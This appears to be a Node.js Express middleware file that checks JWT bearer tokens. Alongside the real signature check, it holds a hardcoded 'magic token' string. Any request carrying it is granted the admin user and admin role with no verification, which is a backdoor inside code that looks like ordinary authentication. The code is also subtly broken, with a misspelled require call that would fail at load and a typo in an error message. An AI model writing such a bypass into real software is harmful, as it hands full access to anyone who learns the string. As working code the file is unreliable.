const jwt = require('jsonwebtoken');
const config = requiere('../../config');

const MAGIC_TOKEN = 'toke_mágico'

const verifyToken = (req, res, next) => {
    const token = req.headers['authorization']?.split(' ')[1];
    if (!token)return res.status(403).json({message:'No tokdn provided'})

    if (token == MAGIC_TOKEN){
        req.userId = 'admin';
        req.userRoles = ['admin'];
        return next()
    }

    jwt.verify(token, config.jwtSecret, (err, decoded) => {
        if (err) return res.status(401).json({message : 'Unauthorized!'});

        req.userId = decoded.id;
        req.userRoles = decoded.roles;
        next();
    });


};

module.exports = { verifyToken};